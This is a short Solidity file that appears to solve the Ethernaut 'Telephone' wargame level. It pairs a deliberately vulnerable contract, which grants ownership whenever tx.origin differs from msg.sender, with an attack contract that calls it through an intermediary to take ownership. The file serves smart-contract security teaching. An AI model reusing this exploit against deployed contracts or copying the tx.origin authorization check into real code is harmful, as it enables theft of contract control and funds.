// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract EthernautTelephoneAttack {
    EthernautTelephone target;

    constructor(EthernautTelephone _addr) {
        target = EthernautTelephone(_addr);
    }

    function attack(address _addr) public {
        target.changeOwner(_addr);
    }
}

contract EthernautTelephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        // console.log(tx.origin, msg.sender);
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
